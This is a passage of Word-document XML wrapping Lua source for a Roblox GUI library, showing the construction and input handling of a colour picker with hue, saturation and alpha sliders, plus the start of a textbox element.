    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 8, 0, 8);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ZIndex = 5;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(255,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"satvalpicker" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 9999)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rgb(255, 255, 255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "satvalpicker" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ApplyStrokeMode = Enum.ApplyStrokeMode.Border;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"hue_gradient" ] = library:create( "TextButton" , {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Position = dim2(0, 10, 1, -64);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -20, 0, 8);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rgb(255, 0, 0)), rgbkey(0.17, rgb(255, 255, 0)), rgbkey(0.33, rgb(0, 255, 0)), rgbkey(0.5, rgb(0, 255, 255)), rgbkey(0.67, rgb(0, 0, 255)), rgbkey(0.83, rgb(255, 0, 255)), rgbkey(1, rgb(255, 0, 0))};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "hue_gradient"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"hue_gradient"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"hue_picker" ] = library:create( "TextButton" , {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vec2(0, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "hue_gradient" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 0, 0.5, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 8, 0, 8);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ZIndex = 5;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(255,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"hue_picker" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 9999)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rgb(255, 255, 255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "hue_picker" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ApplyStrokeMode = Enum.ApplyStrokeMode.Border;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"alpha_gradient" ] = library:create( "TextButton" , {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Position = dim2(0, 10, 1, -46);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -20, 0, 8);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(25, 25, 29);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"alpha_gradient"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"alpha_picker" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        AutoButtonColor = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Text = "";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        AnchorPoint = vec2(0, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "alpha_gradient" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(1, 0, 0.5, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 8, 0, 8);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ZIndex = 5;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(255,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"alpha_picker" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 9999)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"UIStroke" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Color = rgb(255, 255, 255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ApplyStrokeMode = Enum.ApplyStrokeMode.Border;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "alpha_picker"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rgb(0, 0, 0)), rgbkey(1, rgb(255, 255, 255))};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "alpha_gradient"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"alpha_indicator" ] = library:create( "ImageLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ScaleType = Enum.ScaleType.Tile;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "alpha_gradient" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Image = "rbxassetid://18274452449";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, 0, 1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TileSize = dim2(0, 6, 0, 6);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(0,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Color = rgbseq{rgbkey(0, rgb(112, 112, 112)), rgbkey(1, rgb(255, 0, 0))};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Transparency = numseq{numkey(0, 0.8062499761581421), numkey(1, 0)};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "alpha_indicator"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"alpha_indicator" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 6)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"UIGradient" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Rotation = 90;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "colorpicker_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Color = rgbseq{rgbkey(0, rgb(255, 255, 255)), rgbkey(1, rgb(66, 66, 66))}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "input" ] = library:create( "TextBox" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        AnchorPoint = vec2(1, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Text = "";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "colorpicker_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextTruncate = Enum.TextTruncate.AtEnd;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PlaceholderColor3 = rgb(255, 255, 255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CursorPosition = -1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ClearTextOnFocus = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextSize = 14;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(255, 255, 255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextColor3 = rgb(72, 72, 72);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(1, -8, 1, -11);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -16, 0, 18);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(33, 33, 35)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    }); 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"input" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 3)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"UICorenr" ] = library:create( "UICorner" , { -- fire misstypo (im not fixing this RAWR)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "colorpicker_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";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--                  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.set_visible(bool)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "colorpicker_fade" ].BackgroundTransparency = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "colorpicker_holder" ].Parent = bool and library[ "items" ] or library[ "other" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "colorpicker_holder" ].Position = dim_offset(items[ "colorpicker" ].AbsolutePosition.X, items[ "colorpicker" ].AbsolutePosition.Y + items[ "colorpicker" ].AbsoluteSize.Y + 45)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "colorpicker_fade" ], {BackgroundTransparency = 1}, Enum.EasingStyle.Quad, 0.4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "colorpicker_holder" ], {Position = items[ "colorpicker_holder" ].Position + dim_offset(0, 20)}) -- p100 check</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not (self.sanity and library.current_open == self and self.open) then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:close_element(cfg)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function cfg.set(color, alpha)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if type(color) == "boolean" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if color then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    h, s, v = color:ToHSV()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if alpha then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    a = alpha</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Color = hsv(h, s, v)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- Ok so quick story, should I cache any of this? no...?? anyways I know this code is very bad but its your fault for buying a ui with animations (on a serious note im too lazy to make this look nice)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- Also further note, yeah I kind of did this scale_factor * size-valuesize.plane because then I would have to do tomfoolery to make it clip properly.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "hue_picker" ], {Position = dim2(0, (items[ "hue_gradient" ].AbsoluteSize.X - items[ "hue_picker" ].AbsoluteSize.X) * h, 0.5, 0)}, Enum.EasingStyle.Linear, 0.05)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "alpha_picker" ], {Position = dim2(0, (items[ "alpha_gradient" ].AbsoluteSize.X - items[ "alpha_picker" ].AbsoluteSize.X) * (1 - a), 0.5, 0)}, Enum.EasingStyle.Linear, 0.05)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "satvalpicker" ], {Position = dim2(0, s * (items[ "saturation_holder" ].AbsoluteSize.X - items[ "satvalpicker" ].AbsoluteSize.X), 1, 1 - v * (items[ "saturation_holder" ].AbsoluteSize.Y - items[ "satvalpicker" ].AbsoluteSize.Y))}, Enum.EasingStyle.Linear, 0.05)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "alpha_indicator" ]:FindFirstChildOfClass("UIGradient").Color = rgbseq{rgbkey(0, rgb(112, 112, 112)), rgbkey(1, hsv(h, 1, 1))}; -- shit code</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "colorpicker" ].BackgroundColor3 = Color</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "colorpicker_inline" ].BackgroundColor3 = Color</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "saturation_holder" ].BackgroundColor3 = hsv(h, 1, 1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "hue_picker" ].BackgroundColor3 = hsv(h, 1, 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "alpha_picker" ].BackgroundColor3 = hsv(h, 1, 1 - a)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "satvalpicker" ].BackgroundColor3 = hsv(h, s, v)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flags[cfg.flag] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Color = Color;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Transparency = a </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local color = items[ "colorpicker" ].BackgroundColor3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "input" ].Text = string.format("%s, %s, %s, ", library:round(color.R * 255), library:round(color.G * 255), library:round(color.B * 255))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "input" ].Text ..= library:round(1 - a, 0.01)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.callback(Color, a)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function cfg.update_color() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local mouse = uis:GetMouseLocation() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local offset = vec2(mouse.X, mouse.Y - gui_offset) </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if dragging_sat then</w:t>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    s = math.clamp((offset - items["sat"].AbsolutePosition).X / items["sat"].AbsoluteSize.X, 0, 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    v = 1 - math.clamp((offset - items["sat"].AbsolutePosition).Y / items["sat"].AbsoluteSize.Y, 0, 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                elseif dragging_hue then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    h = math.clamp((offset - items[ "hue_gradient" ].AbsolutePosition).X / items[ "hue_gradient" ].AbsoluteSize.X, 0, 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                elseif dragging_alpha then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    a = 1 - math.clamp((offset - items[ "alpha_gradient" ].AbsolutePosition).X / items[ "alpha_gradient" ].AbsoluteSize.X, 0, 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.set()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "colorpicker" ].InputBegan:Connect(function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.Touch then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.open = not cfg.open </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.set_visible(cfg.open)   </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end          </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            uis.InputChanged:Connect(function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if (dragging_sat or dragging_hue or dragging_alpha) and input.UserInputType == Enum.UserInputType.Touch then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.update_color() 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library:connection(uis.InputEnded, function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if input.UserInputType == Enum.UserInputType.Touch then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    dragging_sat = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    dragging_hue = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    dragging_alpha = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)    </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "alpha_gradient"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dragging_alpha = true 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items[ "hue_gradient"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dragging_hue = true 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items[ "sat"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dragging_sat = true  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "input" ].FocusLost:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local text = items[ "input" ].Text</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local r, g, b, a = library:convert(text)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if r and g and b and a then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.set(rgb(r, g, b), 1 - a)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items[ "input" ].Focused:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "input" ], {TextColor3 = rgb(245, 245, 245)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "input" ].FocusLost:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "input" ], {TextColor3 = rgb(72, 72, 72)})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cfg.set(cfg.color, cfg.alpha)</w:t>
      </w:r>
    </w:p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library:textbox(options) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = options.name or "TextBox",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                placeholder = options.placeholder or options.placeholdertext or options.holder or options.holdertext or "type here...",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                default = options.default or "",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flag = options.flag or library:next_flag(),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                callback = options.callback or function() end,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                visible = options.visible or true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            flags[cfg.flag] = cfg.default</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local items = cfg.items; do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "textbox" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LayoutOrder = -1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FontFace = fonts.font;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"textbox" ];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16;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"name" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingRight = dim(0, 5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingLeft = dim(0, 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"right_components" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "textbox"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4, 0, 19);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, 0, 0, 12);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"right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Padding = dim(0, 7);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SortOrder = Enum.SortOrder.LayoutOrder;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FillDirection = Enum.FillDirection.Horizontal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"input" ] = library:create( "TextBox" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Text = "";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextTruncate = Enum.TextTruncate.AtEnd;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PlaceholderColor3 = rgb(255, 255, 255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    CursorPosition = -1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ClearTextOnFocus = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextSize = 14;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(255, 255, 255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextColor3 = rgb(72, 72, 72);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(1, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, -4, 0, 30);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(33, 33, 35)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }); </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:create( "UICorner" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "input" ];</w:t>
